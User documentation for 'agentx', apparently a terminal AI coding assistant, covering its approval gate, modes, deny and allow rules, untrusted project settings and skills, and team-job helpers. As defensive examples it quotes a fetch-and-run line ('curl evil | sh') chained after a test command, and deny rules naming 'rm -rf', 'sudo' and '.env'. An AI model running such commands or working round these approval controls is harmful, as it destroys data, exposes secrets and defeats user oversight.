# The `agentx` command

`agentx` is a terminal coding assistant built on this framework. You run it in a project folder and type requests. The model reads files, edits them and runs commands in that folder, and you approve anything that changes something before it happens.

It is a front end over `AgentRunner`, `DefaultTools` and `Session`: the chat loop, the approval prompts, the settings file and the slash commands are new; the engine and the tools are the ones you already have.

Version 3.7.0. Not in this version: token-by-token output, a headless mode (`agentx -p "task"`), MCP configuration, custom commands, hooks and a mode that never asks about anything (see [Limits in this version](#limits-in-this-version)).

## Quick start

```bash
pip install agentx-dev
export ANTHROPIC_API_KEY=sk-ant-...      # or OPENAI_API_KEY=sk-...
cd my-project
agentx
```

Windows PowerShell: `$env:ANTHROPIC_API_KEY = "sk-ant-..."`.

Claude also needs its SDK: `pip install "agentx-dev[anthropic]"`. The OpenAI provider is in the base install. `python -m agentx_dev` starts the same program.

The first time you start `agentx` in a folder it asks whether you trust it, like Claude Code:

```
Accessing workspace:

 C:/Users/you/projects/site

Quick safety check: is this a project you created or one you trust? ...
> 1. Yes, I trust this folder
  2. No, exit
```

Nothing in the folder (its `AGENTX.md`, its `.agentx/settings.json`) is read until you say yes. The answer is kept in `~/.agentx/trusted.json`, and subfolders of a trusted project are trusted too. Your home folder and a drive root cover only themselves, and the question warns you when you start there.

Keys are read from the environment only. With no `--model`, the first key found decides: `ANTHROPIC_API_KEY` (Claude), then `OPENAI_API_KEY` (GPT), each with its class's own default model. A name that starts with `claude` builds `Claude`; one that starts with `gpt`, or with `o` and a digit (`o3`), builds `GPT`. With no key, `agentx` prints a short message naming the two variables and exits with code 1.

### Flags

| Flag | Does |
|---|---|
| `--model NAME` | Model to use, for example `claude-sonnet-4-6` or `gpt-4o`. Overrides `model` in the settings files. |
| `--mode MODE` | `default`, `accept-edits`, `plan` or `auto`. Overrides `mode` in the settings files. |
| `--add-dir PATH` | Let the tools work in this extra folder as well. Repeatable. A relative path starts at the current folder. |
| `--continue` | Resume the latest conversation for this folder. With none saved, it says so and starts a new one. |
| `--resume [ID]` | Resume a saved conversation: with no id, pick from a numbered list; with an id, a file name or a unique id prefix of at least four characters. An id that matches nothing is an error (exit code 1). |
| `--version` | Print the version and exit. |

`--continue` and `--resume` cannot be combined. A flag that does not exist exits with code 2 (argparse's usage error).

`agentx` needs an interactive terminal. If standard input or output is not a terminal (a pipe, a CI job), it prints "agentx needs an interactive terminal (headless mode is not available yet)." and exits with code 1.

## What it can do

The main agent gets the ten tools from [`DefaultTools`](../concepts/tools.md) plus `start_team_job` and `use_skill`, twelve in all. The ten are limited to the folder you started in (plus any extra folders, see [Extra folders](#extra-folders)). A path outside those folders fails inside the tool.

| Kind | Tools | What happens |
|---|---|---|
| read | `read_path`, `list_directory`, `find_files`, `grep` | Runs without asking. |
| edit | `write_file`, `edit_file` | Asks, except in `accept-edits` mode. |
| command | `run_shell`, `run_python` | Asks. |
| destructive | `delete_path`, `move_file` | Always asks, in every mode. |
| team | `start_team_job` | Asks, and "don't ask again" is never offered. Refused in `plan` mode. Runs without asking in `auto` mode (or with your own allow rule). See [Team jobs](#team-jobs). |
| skills | `use_skill` | Runs without asking: it only reads a skill's text (or a file inside the skill's folder). See [Skills](#skills). |

Limits that come from the tools, not from `agentx`: a shell command is stopped after 5 minutes and Python code after 2 minutes (the time spent waiting for your approval does not count), and long output is cut (40,000 bytes for a shell command, 100,000 for Python). A dev server or a watcher will hit the 30-second limit and be killed. `agentx` does not change these and has no setting for them.

`run_shell` and `run_python` run with a **scrubbed environment**: only `PATH`, `HOME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ`, `TMPDIR`, `TMP`, `TEMP`, the UTF-8 variables `PYTHONIOENCODING` and `PYTHONUTF8`, and on Windows `SystemRoot`, `COMSPEC`, `PATHEXT`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA` and `windir` are passed on. Everything else is dropped, so a command or script cannot print your API keys, and it also does not see `VIRTUAL_ENV`, `SSH_AUTH_SOCK` (git over ssh will not find your agent), proxy settings (`HTTP_PROXY`, `HTTPS_PROXY`), `JAVA_HOME`, `NODE_PATH`, `CONDA_PREFIX`, `GOPATH` or any other variable your tools expect. A command that needs one has to set it itself (`JAVA_HOME=/opt/jdk mvn test`). There is no setting for this in `agentx` yet. `run_python` runs in the interpreter that runs `agentx`, not in your project's virtual environment, so it does not see the project's installed packages unless `agentx` is installed there too; use `run_shell` with the project's own interpreter (`.venv/bin/python script.py`) for that. A turn runs at most 50 model steps, and tool calls run one at a time so only one prompt is ever open.

## Approvals

Every tool call goes through a gate before it runs. The gate runs it, asks you, or refuses it.

### Modes

| Mode | Behaviour |
|---|---|
| `default` | Edits, commands and destructive actions ask. |
| `accept-edits` | Edits run without asking. Commands and destructive actions still ask. |
| `plan` | Reads only. Anything else, team jobs included, is refused and the model is told to propose a plan in its answer instead. |
| `auto` | File edits, shell commands and Python run without asking, and so do team jobs. Delete, move and tools the gate does not know (such as MCP tools) still ask. The built-in protections and your deny rules still apply. |

**`auto` is on purpose only.** Choose it with `--mode auto`, `"mode": "auto"` in your own settings file, or `/mode auto`. Shift+Tab never enters it and always leaves it (to `default`), answering `a` never sets it, and a project's settings file cannot turn it on (ignored with a warning). Shell and Python can do anything your account can, so a command that deletes files is not stopped by the `delete_path` prompt; use `auto` in folders you trust, and keep a deny rule for anything you must protect (deny rules also apply to shell commands by their text, for example `run_shell:*rm -rf*`).

Set the mode with `--mode`, with `mode` in a settings file, with `/mode`, or with Shift+Tab (it cycles `default`, `accept-edits`, `plan`; `auto` is not in the cycle). The status bar shows the current mode.

### The prompt

Before an edit, a command or a destructive action, `agentx` draws a box:

```text
+- edit_file -------------------------------------------+
| Action: Edit src/app.py                                |
| Subject: src/app.py                                    |
|                                                        |
| --- a/src/app.py                                       |
| +++ b/src/app.py                                       |
| @@ -10,3 +10,4 @@                                      |
| -    return 1                                          |
| +    return 2                                          |
+--------------------------------------------------------+
Do you want to proceed?
> 1. Yes
  2. Yes, and don't ask again: all edits this session
  3. No, and tell the model what to do instead
```

Move with the Up and Down arrow keys and press Enter, or press the number (or `y`, `a`, `n`). Esc, Ctrl+C and Ctrl+D count as no. On a terminal that cannot draw the menu (or when input is piped) the same question is asked as a typed `[y/a/n]` line.

(The real box is drawn by `rich`, and the diff is coloured: green for added lines, red for removed.)

- **Action** is the full description of what will happen ("Edit src/app.py", "Delete build and everything inside it", "Run shell command in tools").
- **Subject** is a second line, shown when it adds something: it is the text the gate actually judged, in its resolved form (for a path, resolved against the project folder with links followed). Both lines wrap; neither is ever cut, so a long command or a hostile-looking tail past the screen width is still fully visible.
- The body is a unified diff for `write_file` and `edit_file` (computed against the file on disk; a new file shows as all additions), the exact command for `run_shell`, the code for `run_python`, and nothing more for delete and move (the paths are in Action and Subject).
- A **move into an existing folder** lands at `folder/<name>`, and the prompt says so ("Move a to b/a"); a move onto an existing file says "(replaces the existing b)". The gate judges the final path, so a protected name cannot be reached by moving it into a folder.

Answers (typed, or the menu entries above):

| Key | Meaning |
|---|---|
| `y` | Allow this call. |
| `a` | Allow, and do not ask again (see below). Offered only when the gate can remember something; otherwise the prompt shows `[y] yes   [n] no`. |
| `n` | Refuse. You are then asked for an optional reason, which the model is told. |

`yes`, `no` and `always` also work when typed. In the typed prompt, bare Enter, end of input (Ctrl+D) and Ctrl+C count as no, and any other word is not guessed at: the question is asked again. In the menu, "Yes" is highlighted at first, so Enter alone approves; move down to refuse.

A refusal is an ordinary tool result, never an error: the model receives "The user declined: <your reason>" (or "The user declined this action.") and is expected to adjust or ask you what you want.

### What `a` means

The prompt prints exactly what `a` will remember.

- **An edit prompt:** switches the gate to `accept-edits` for the rest of the conversation. `/clear` and `/resume` put the mode back to the one that was in force when you answered `a`. A mode you set yourself afterwards (`--mode`, `/mode`, Shift+Tab) is yours and is kept.
- **A shell command:** remembers a plain command prefix for the rest of the conversation: the first word, or the first two for `git`, `npm`, `pnpm`, `yarn`, `pip`, `cargo`, `go`, `docker` and `make`. So `a` on `pytest -x` skips the next `pytest ...`, and `a` on `git status` skips `git status ...` but not `git push`.
- **Nothing is remembered** (so `a` is not offered) for: `run_python` (each call is approved on its own), `delete_path` and `move_file`, compound commands, interpreters, shells and wrappers (`python`, `node`, `bash`, `sudo`, `ssh`, `npx`, `env`, `xargs` and similar, including versioned names such as `python3.12`), a first word that is not made only of letters, digits and `. _ + / -` (so `CI=1 pytest` and quoted or expanded commands grant nothing), `git -c ...` or any two-word command whose second word is an option, and package runners (`npm exec`, `pnpm dlx`, `yarn dlx` and so on).

`/clear` and `/resume` clear these session-wide grants. Rules from your settings files stay.

### When a prompt is skipped

- A preview that cannot be shown is declined for you, with the reason printed and passed to the model: a file or new content over 1,000,000 bytes or characters, more than 20,000 lines to compare, an existing file that is binary or not UTF-8.
- A command, code or tool-argument text over 20,000 characters is declined ("command too long to review"). It is never approved on a partial view.
- A diff longer than 200 lines is shown cut, with a marker that counts what is hidden ("... 340 more lines"). That one you can still approve.

### Ctrl+C

- At an approval prompt, Ctrl+C declines that one call only. The turn goes on and the model is told the question was interrupted.
- During a turn, Ctrl+C aborts the turn. Changes already made in that turn stay on disk; they are not undone. The interrupted turn is not recorded in the conversation, so the model will not remember it. Earlier turns are kept.
- At an idle prompt, Ctrl+C prints a reminder. Use `/exit` or Ctrl+D to leave.

## Default protections

These deny rules are always on, in every mode, `accept-edits` included. They refuse writing, editing, deleting and moving (a move is refused when either side matches, and when the destination is an existing folder, when the final path `folder/<name>` matches) and they are not asked about:

- **The whole `.git` folder or file**, at the top of the project and in any sub-folder. Git follows a `.git` file, `.git/config` (hooks path, aliases) and `.git/hooks/*`, and what runs from there runs later, outside the approval prompts. The honest reason it is refused rather than asked: a change under `.git/` is invisible to `git status` and `git diff`, unlike an edit to `conftest.py`, a `Makefile` or `package.json`, which you can see in review before you run anything.
- **`.agentx` and everything under it** at the top of the project (`.agentx/*`, where the project settings live), and `~/.agentx`. A model must not rewrite its own permissions.
- **In your home folder:** `~/.gitconfig`, `~/.config/git` and everything under it, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.zshrc`, `~/.zprofile` and `~/.config/fish/config.fish`. These matter only when the tools can reach the home folder (the project is the home folder, or it is an extra folder).

Names that merely start alike (`.gitignore`, `.github/`) are not covered. Reading these files is still allowed. The rules match every spelling of a path they can compute: relative, absolute, `./`, `..`, backslashes, links followed, and case folded on Windows and macOS.

### What deny and allow rules are not

- They are **a convenience layer, not a secrets vault.** A deny rule on `read_path:.env` stops the model's `read_path` on that file. `grep`, `find_files` and `list_directory` pointed at a folder above it can still read its contents or name it.
- `run_shell` and `run_python` are **not covered by path deny rules at all.** A shell command can reach any file the shell can. They still ask, unless an allow rule or a grant covers the command; the prompt, where you can read the command, is the protection there.
- Deny globs on shell commands are best effort (start them with `*`); a model can spell a command another way. A `run_python` rule sees only the first line of the code.
- Files outside the project that run later, other than the short list above, are not protected.

So keep secrets out of the project folder, and read what you approve.

On Windows the gate also refuses outright, before any rule, path forms it cannot judge by name: UNC and device paths (`\\host\x`, `\\?\C:\x`), alternate data streams (`file::$DATA`), drive-relative paths (`C:file`) and components ending in a dot or a space.

## Settings

Two optional files, both JSON:

- `~/.agentx/settings.json` (yours). The first time you run `agentx` it writes this file for you, once the model
  is built, with that model's name (set by your API key) written out, so there is a file to edit. If no model can
  be built (no key, say) the file is still written, without a `"model"` line. It is never overwritten afterwards.
  `"model"` here is the default for folders that have no `.agentx/settings.json` of their own (for example
  `"gpt-4o-mini"`); a folder's own file, which `agentx` writes when you first trust the folder, wins over it.
  `/model <name>` changes the model for one session only, and `/settings` shows what is in force and where the
  files are.
- `.agentx/settings.json` in the project (it can be committed with the repository). The first time you trust a
  folder `agentx` writes it for you with the model in use, and `/model <name> --folder` changes it (see
  [Project memory](#project-memory)).

```json
{
  "model": "claude-sonnet-4-6",
  "mode": "default",
  "addDirs": ["../shared"],
  "teamModels": ["claude-opus-5-5", "gpt-5.5"],
  "permissions": {
    "allow": ["run_shell:pytest*", "run_shell:git status*"],
    "deny": ["run_shell:*sudo*", "read_path:.env"]
  }
}
```

**Merging.** User settings are read first, then the project's. Single values (`model`, `mode`) from the project win, and so does the whole `teamModels` list (see [Helper models](#helper-models)); `addDirs` and the allow and deny lists are joined (the project's allow rules only if you say yes at startup, see [Project settings are untrusted](#project-settings-are-untrusted)). A deny rule from either file wins. Flags override the settings files. A file with invalid JSON, or a value of the wrong type, is reported by path as a warning before the first prompt and ignored. A model named in a settings file that cannot be built is reported with the path of the file it came from. `"model": "(no model)"` (a placeholder an earlier 3.7.0 build could write into your file) is ignored with a warning asking you to delete that line; the file itself is not changed.

**Rule syntax.** A rule is `tool:glob`, matched with `fnmatch` against a subject that depends on the tool. A rule with no colon (`run_shell`) matches every call of that tool, so write it only if you mean that.

| Tool | Subject the glob is matched against |
|---|---|
| `run_shell` | The command, with every run of whitespace collapsed to one space. |
| `run_python` | The first line of the code. |
| `read_path`, `list_directory`, `find_files`, `grep`, `write_file`, `edit_file`, `delete_path` | The path. |
| `move_file` | `source -> destination`. |
| `start_team_job` | The task text (never the reason). `"deny": ["start_team_job:*"]` turns [team jobs](#team-jobs) off in every mode. |

A deny rule applies to reads too. Allow rules never apply to `delete_path` and `move_file`, which always ask.

**Paths are matched in two spellings:** as written (with `.` and `..` folded away) and resolved against the project (links followed). A deny rule refuses the call if either matches; an allow rule applies only if both do. So `read_path:.env` is not dodged by `./.env`, `sub/../.env` or the absolute path, and `read_path:secrets/*` still blocks a link named `secrets`. A pattern starting with `~` means your home folder. Case is folded on Windows and macOS.

Two safety refinements:

- **Spacing cannot dodge a rule.** Because the shell subject has its whitespace collapsed, `rm   -rf x` matches `*rm -rf*`.
- **Compound commands are never auto-allowed.** A command that chains, pipes, redirects, substitutes or groups (`;`, `&`, `|`, a backtick, `$(`, `(`, `)`, `<`, `>`, a newline, or any character outside printable ASCII such as a control character or a non-breaking space) is not covered by an allow rule or a grant, so a grant for `pytest` cannot approve `pytest && curl evil | sh`. It always asks, and answering `a` to it remembers nothing. Deny rules still match anywhere in it.

### Project settings are untrusted

A repository you just cloned can contain `.agentx/settings.json`. So:

- A project `mode` of `accept-edits` or `auto` is **ignored, with a warning**. Set it in your own settings or with `--mode`. `plan` and `default` from the project are honoured.
- A project `addDirs` entry that resolves outside the project folder is **ignored, with a warning**. Your own file and `--add-dir` are not restricted.
- A project `teamModels` list is **announced at startup**, with any notes on what each model is for (`This project's settings let team helpers also use: gpt-5.5 (fast reading), ...`), with no question: it lets team jobs send work to another model or provider. `/team-models clear` turns it off for the session. See [Helper models](#helper-models).
- Allow rules that come from the project are **listed at startup and you are asked once**: `Honour these project rules? [y/N]`. Only `y` or `yes` keeps them. Bare Enter, Ctrl+D, Ctrl+C or an answer that stays unrecognised after one more try drops them for this session. A repository's `"allow": ["write_file", "edit_file"]` is `accept-edits` under another name, and `"allow": ["run_shell"]` runs every command that is not compound, so they are not taken on trust. Your own allow rules are never affected. The project's **deny** rules are always kept: they only restrict.

### Extra folders

`addDirs` and `--add-dir` entries are turned into absolute paths (`~` is your home folder; a relative entry starts at the project for the project file, at your home folder for your file, and at the current folder for `--add-dir`). They are listed in the startup banner. `agentx` warns when one does not exist (it is never created), and warns more loudly when one is the filesystem root or your home folder, since the tools can then reach everything in it.

## Project context: AGENTX.md

`AGENTX.md` files tell the model how to work in your project: what it is, how to run the tests, the layout, the conventions. `agentx` reads:

1. `~/.agentx/AGENTX.md` (yours, applies everywhere), then
2. `AGENTX.md` in the current folder and each of its parents, from the top down, so the nearest file comes last and wins. The climb stops at the first of: the folder that holds a `.git` entry (that folder's own file is read), your home folder, or the filesystem root. A file in a folder the project merely sits inside is not taken for the project's.

Together with the working folder and the operating system they are passed to the model as its instructions, cut at 20,000 characters in total (the nearest files are kept; a farther file that does not fit is dropped). Project files are marked as coming from the project and cannot override the base rules or the approval prompts. Binary files are skipped, and a link that leads out of its folder is left out.

They are read when `agentx` starts and again on `/clear` and `/resume`.

`/init` asks the model to look at the project and write an `AGENTX.md` in the current folder (it uses `write_file`, so you see the file as a diff first, and if one exists it tells you instead of overwriting). The new file is used from the next conversation (`/clear`).

## Skills

A skill is a short guide for a kind of work ("how to explore a project", "how to change files safely"). The prompt carries one line per skill, with its name and what it is for; the agent opens the full text only when it needs it, by calling the `use_skill` tool. That keeps the prompt small and, because the list is built the same way every time, the same from one request to the next, which is what lets the provider's prompt cache reuse it. The full story, including how to use skills from your own code, is in the [Skills guide](skills.md); this is what the terminal app does.

**Built-in skills.** The first time you start `agentx`, it creates five skills in `~/.agentx/skills/`: `exploring-a-project`, `changing-files`, `running-code` and `delegating-work` (the terminal app has no web tools, so `web-research` is created but not listed). They cover the tools above. You can edit them: `agentx` never overwrites an edit, and does not bring back one you delete. A copy you did not touch is updated when a newer `agentx` ships a newer version.

**Your own skills.** A folder with a `SKILL.md` in `~/.agentx/skills/<name>/` is a skill. Skills written for Claude work as they are. A project can keep its own in `<project>/.agentx/skills/`; those are shown to the agent in a separate block marked as coming from the project folder (which may be a cloned repository), cannot replace a skill of yours with the same name, and cannot override the approval prompts. A `.agentx` or `.agentx/skills` that is a link leading out of the project is not read.

**Using a skill yourself.** Every skill the agent has in this conversation is also a slash command. Type `/` and the pop-up lists the commands, then the skills (marked `(skill)`, with their description); pick one with the arrow keys and Enter, add what you want, and send:

```text
/changing-files rename the helper to util everywhere
/exploring-a-project
```

The agent is told to read that skill with `use_skill` first and then do what you wrote. With nothing after the name, it reads the skill and asks what you want to apply it to. This is the same thing the agent does on its own when its work matches a skill; the slash form just makes sure it does. A skill named like a built-in command (`/model`, `/help`, ...) is reached with `/skills use <name> [what you want]`, because the command wins. The pop-up only offers skills this conversation's agent has: one for a tool it does not have, or one you added since the conversation began, appears after `/clear`.

**Installing from a link.**

```text
/skills install https://github.com/obra/superpowers
```

Accepts `https://github.com/<owner>/<repo>` (optionally `/tree/<branch>/<folder>`) or the path of a folder on your computer. `agentx` looks up the exact commit, downloads that commit, finds every folder with a `SKILL.md`, and shows you the names, the descriptions, the number of files and any program files (`.py`, `.sh`, ...) before it asks `Install 15 skills into ...? [y/N]`. Nothing is saved without a clear yes. Installing does not run anything; a skill's files can only be read by the agent, and anything it then runs goes through the normal approval prompts. A new conversation (`/clear`) uses what you installed. Skills do not update by themselves: to update one, `/skills remove <name>` and install it again.

**What `/skills` does.**

| Command | Does |
|---|---|
| `/skills` | Lists every skill found: the `/name` that runs it, where it came from (`bundled`, `own`, `installed` or `project`), its description, and `[not active in this conversation]` for one this agent does not have (a skill for tools it lacks, or one added since the conversation began). Also lists any that were skipped and why, and the folder they live in. |
| `/<skill> [what you want]` | Use a skill now: see above. Also in the `/` pop-up. |
| `/skills use <name> [what you want]` | The same, for a skill whose name is also a command. |
| `/skills install <link or folder>` | As above. |
| `/skills remove <name>` | Asks, then deletes the skill's folder from `~/.agentx/skills/`. A project skill is not removed by this: it belongs to the project. |

**Only you can install.** The agent has no tool to install or remove a skill, and its file tools can never write to `.agentx` or `~/.agentx` (see [Default protections](#default-protections)). A skill is instructions the agent will follow, so install only skills you trust. A skill from a link or a project is shown to the model with a note that it cannot override the rules or the approval prompts. An archive is unpacked with limits (20 MB, 3,000 files, 1 MB a file, 50 skills), paths that leave the folder and links are refused, and a downloaded skill cannot take the name of a built-in one.

## Conversations

Each conversation is saved as it goes, to `~/.agentx/sessions/<project>/<UTC timestamp>-<id>.json`, where `<project>` is the absolute folder with separators and colons replaced by `-`, followed by `-` and a short hash of the full path (so `C:\a-b` and `C:\a\b` keep separate conversations). It is saved after every turn and when you leave. An empty conversation leaves no file.

- `agentx --continue` picks up the latest conversation for this folder.
- `agentx --resume` lists them (newest first, with the first message as a title) and loads the one you choose; `agentx --resume ID` loads it directly.
- Inside a session, `/sessions` lists them and `/resume [id]` loads one.
- `/clear` starts a new conversation (a new file). Earlier ones stay on disk.
- Ctrl+C during a turn keeps the earlier turns and drops the interrupted one.

A missing or unreadable session file is reported in one line and a new conversation starts.

Two things to know about the files on disk. The session files hold the full history, **including tool results, so the contents of files the model read and the output of commands**. They are plain JSON and are not encrypted. The input history (`~/.agentx/history`, what Up arrow recalls) stores everything you type; `agentx` makes that file readable by you only where the platform allows. Do not paste secrets into the chat, and treat `~/.agentx` as sensitive.

### The log

When a tool raises an error, the framework logs it with a full traceback. `agentx` keeps those messages off the screen (they can quote text the model chose, escape sequences included) and writes warnings and errors to `~/.agentx/agentx.log` instead: a rotating file, 512 KB with two older copies kept, control characters written out as `\x1b`. It is best effort: if the folder cannot be written there is simply no log. The log can contain tool errors, which quote paths, commands and file names from your project, so treat it like the session files.

## Slash commands

A line that starts with `/` followed by a plain name is a command and is never sent to the model. `/tmp/build.log fails` or `/README.md` is a message, not a command. An unknown command prints the list. A name that is one of the agent's [skills](#skills) is not unknown: `/changing-files rename the helper` asks the agent to use that skill for the task. Typing `/` shows the commands and then the skills.

| Command | Does | Example |
|---|---|---|
| `/help` | List the commands. | `/help` |
| `/clear` | Save this conversation and start a new one, which begins from the newest entries of the [work log](#the-work-log). Clears the "don't ask again" grants and undoes an edit grant; the mode and your settings rules stay. | `/clear` |
| `/model [name] [--folder]` | Show or switch the model. The conversation is kept. A model that cannot be built (no key) leaves the old one in place. `/model <name>` lasts for this session only; `/model <name> --folder` also saves it for this folder (see [Project memory](#project-memory)). | `/model claude-opus-5-5 --folder` |
| `/mode [name]` | Show or set the mode: `default`, `accept-edits`, `plan` or `auto` (see [Modes](#modes)). | `/mode plan` |
| `/settings` | Show the model, mode, rules and helper models in force, and the paths of your settings file and the project's. | `/settings` |
| `/resume [id]` | Load a saved conversation: with no id, a list to pick from; with an id, or its first characters, that one. | `/resume 3f9a2c1b` |
| `/sessions` | List this folder's saved conversations, newest first: date, first message and id. | `/sessions` |
| `/init` | Ask the model to draft an `AGENTX.md` for this project. Writing it goes through the approval prompt. | `/init` |
| `/team <task>` | Ask the agent to hand a big job to a team of helpers (see [Team jobs](#team-jobs)). With no task it prints the usage. | `/team add type hints to every module and run the tests` |
| `/team-models [name[=use] ...\|describe\|clear] [--folder]` | Show or set the extra models team helpers may run on, with an optional note on what each is for (see [Helper models](#helper-models)). `/team-models <names>` lasts for this session only; with `--folder` it is also saved for this folder. `/team-models describe` asks the chat model to write the missing notes (marked `auto:`). `/team-models clear` empties the list. | `/team-models gpt-6.1-sol="hard coding" claude-sonnet-5-5 --folder` |
| `/skills [install <link>\|remove <name>\|use <name> ...]` | List the skills the agent can read (each is also a `/name` command in the pop-up, e.g. `/changing-files rename the helper`), or add one from a `https://github.com/<owner>/<repo>` link or a folder (you are shown what it contains and asked first), or remove one. See [Skills](#skills). | `/skills install https://github.com/obra/superpowers` |
| `/exit` | Save the conversation and leave (Ctrl+D does the same). | `/exit` |

## Team jobs

For a big, multi-part job (several files or areas: research, then changes, then tests) one conversation can lose its place. For that the main agent has one more tool, `start_team_job`. When it calls it, a supervisor plans the job in up to 6 steps and hands each step to one of three helpers, one at a time. Small and medium jobs stay with the normal agent, which is told to do them itself.

`/team <task>` asks for the same thing by hand: it sends the agent a message asking it to call `start_team_job` for your task. It is an ordinary message, so the model may still decline, and then nothing runs.

### The helpers

| Helper | Tools | For |
|---|---|---|
| `explorer` | `read_path`, `list_directory`, `find_files`, `grep` | Looking things up. |
| `coder` | the explorer's, plus `write_file`, `edit_file` | Changing files. |
| `runner` | the explorer's, plus `run_shell`, `run_python` | Running commands and tests. |

No helper has `delete_path`, `move_file` or `start_team_job`, so a helper cannot delete, move or start another team. The roster is fixed; the supervisor cannot invent a helper. (With [helper models](#helper-models) set, each of the three roles exists once per model, the chat's model included, named `coder@<model>` and so on.) The roles steer the helpers, they are not a sandbox: `run_shell` can write files. What protects you is the gate, and the helpers use the same one as the chat.

### The approval

Before a job starts you get a prompt like any other, with the task, the reason the agent gave, the helpers and a warning that a team job makes many model calls and can take several minutes. The mode decides what happens:

| Mode | Behaviour |
|---|---|
| `default`, `accept-edits` | Asks. `accept-edits` does not cover it. "Don't ask again" is never offered, so each hand-off is asked about. |
| `plan` | Refused, like every other change. |
| `auto` | Runs without asking. |

A deny rule turns the feature off in every mode (see [Turning it off](#turning-it-off)). An allow rule of your own, `"allow": ["start_team_job"]`, lets it run without asking. If you decline, the agent may ask again in the same message. One message may run **up to 5 team jobs**: a big task ("move all the calls") often takes several batches, so when a job ends partial and the task is not finished, the agent starts the next batch itself instead of stopping to ask you to "continue" (in `default` and `accept-edits` mode each job is still asked about; in `auto` mode they just run). A sixth is refused at once, before any prompt ("5 team jobs already ran for this message"), and the agent reports what is done and what remains; your next message can start more.

### What the helpers may do

Every tool call a helper makes goes through the same gate as the chat: the modes, the deny rules, the protected files, the previews and the prompts, and still one prompt at a time. The approval box gets an extra line naming who is asking:

```text
+- edit_file -------------------------------------------+
| Action: Edit src/app.py                                |
| Helper: coder                                          |
| Subject: src/app.py                                    |
| ...                                                    |
```

Answering `a` ("don't ask again: all edits this session") at a helper's edit prompt does what it does in the chat: it switches the whole session to `accept-edits` until `/clear` or `/resume`, so the rest of the job's edits (and later edits in the chat) run without asking. Answer `y` if you want to approve each one.

### What you see

- The plan: `Team plan:` and a numbered list of the steps, each with the helper it is for.
- `-> coder: <what it was asked>` when a step starts, and a spinner that reads "Running coder" (it says "Planning the team job" before the plan, and "Team is working" between steps).
- Each helper tool call as a line like the chat's, with the helper in front, before its prompt: `● [coder] write_file src/app.py`.
- `done (coder): <the start of its report>` or `failed (coder): <why>` when a step ends. The text is the start of the report or error (up to 160 characters, newlines flattened); an empty report shows `(no report)`. A skipped step (for example one whose dependency failed) shows as `failed (coder): skipped: ...` here and as "skipped" in the result.

The planner or a helper may need a fact only you have. It is asked as `Team question: ...` (a long question is cut at 12 lines and 1,500 characters) with `Answer (Enter to skip):`. Enter, Ctrl+D or Ctrl+C at that question skips it, and the team goes on without the answer; at most 3 questions are asked per job.

### The result

When the job ends, the agent gets one text back as the result of its tool call: the outcome, the numbered steps each marked done, partial (ran out of steps), failed or skipped, and the final answer, then `(team job N of 5 for this message)`. When a helper ran out of steps the first line says so (`outcome: partial - 1 step ran out of steps; the task may be unfinished`), and that helper's report lists every file it changed (`Files it changed (12): ...`), so the next batch knows what is already done. The whole text (outcome line, steps and answer together) is cut at 6,000 characters. That text is part of the conversation, so you can say "now fix the second item" and the agent knows what the team did, and it is in the saved session, so `--continue` and `/resume` include it. If the job itself fails (a model error, say), the agent gets a one-line failure ending "Some steps may already have changed files." and decides what to do.

### Ctrl+C

Ctrl+C at an approval prompt declines that one call, as always. Ctrl+C anywhere else during a job (a helper working, the planner thinking) stops the job and aborts the turn: "Turn interrupted" is printed, changes the helpers already made stay on disk, and the turn is not recorded in the conversation. At a team question it only skips the question.

### Helper models

By default every helper, and the planner, runs on the chat's model. You can allow extra models, and then the supervisor chooses, step by step, which model a helper runs on. One job may mix Claude and GPT helpers when both keys are set. The chat's model is always available to the helpers. With a list set, every helper names its model, the chat's own included (`runner@gpt-6-sol`, `coder@gpt-6.1-sol`), and no model is presented as the default. With no list set nothing changes: no `Helper models:` line, and the helpers are the plain `explorer`, `coder` and `runner` with their usual descriptions.

**Setting the list.** Add `teamModels` to `~/.agentx/settings.json` or to a folder's `.agentx/settings.json`:

```json
{
  "teamModels": [
    {"model": "gpt-6.1-sol", "use": "hard coding and bug fixing"},
    "gpt-6-luna=fast reading and search",
    "gpt-5.5"
  ]
}
```

An entry is a model name, optionally with a short note on what that model is for, written as `"name=note"` or as `{"model": "name", "use": "note"}`. The note goes into the description the supervisor reads for that model's helpers (`Good for: hard coding and bug fixing.`), which gives it a reason to pick one model over another. A note is plain text of at most 80 characters; a longer one, or one with control characters, is dropped with a warning and the model is kept. A note on the chat's own model applies to its helpers too.

**Notes the chat model writes.** You do not have to write notes. When you set a list with `/team-models`, `agentx` asks your chat model once, in one call, what each model on it is good for (the chat's own model included, so all of them are described alike), and keeps the answers as notes marked `auto:`, for example `gpt-5.5 (auto: fast, cheaper coding)`. A list loaded from a settings file is described the same way at the first team job of a session. Each model is asked about once per session: setting the list again keeps the notes already written and asks only about new models. If the answer cannot be read at all you are told so (`The model's answer about the helper models could not be read ...`). The chat's own note shows in `/team-models` as `<chat model> (chat; auto: ...)`. The supervisor reads the note without the `auto:` marker. A model can only know models older than itself: one it does not know (or one newer than what it was trained on) gets no note rather than a guess, and `agentx` says so (`No note for ...: the chat model does not know what they are good at.`). A note you wrote is never asked about or replaced. `/team-models describe` asks again, replacing only `auto:` notes (add `--folder` to save them). If the call fails you get `Could not describe the models (<kind of error>); add notes yourself ...` and the list works without notes. With `--folder`, auto notes are saved with the list (`{"model": "gpt-5.5", "use": "auto: fast, cheaper coding"}`); edit one into your own words to keep it from being replaced. The notes are the chat model's own view, not facts from the provider: neither OpenAI nor Anthropic publishes what each model is good at in a form `agentx` can read.

- A name must start with `claude`, `gpt` or `o` and a digit (`o3`), be at most 100 characters, and contain no spaces or control characters. At most 5 names are kept (the first 5): up to 4 extra models, plus your chat's own model if you list it, which does not take an extra-model slot (list it to give it a note). With 5 other models, the fifth is reported at the job as `Not used: <name> (only 4 extra models)`. A repeat, in any case, is dropped. A bad entry is listed in the warnings at startup (or right after `/team-models`) and ignored; the rest of the list works. For a name that is too long or has a space or control character the warning reads `'teamModels': <name> is not a model name (too long, spaces or control characters); skipped`, and for an unknown provider `'teamModels': cannot tell which provider runs <name> (start the name with 'claude' or 'gpt'); skipped`. In both, `<name>` is shown in quotes (and cut at 40 characters). The provider hint names only `claude` and `gpt`, but `o3`-style names are accepted too.
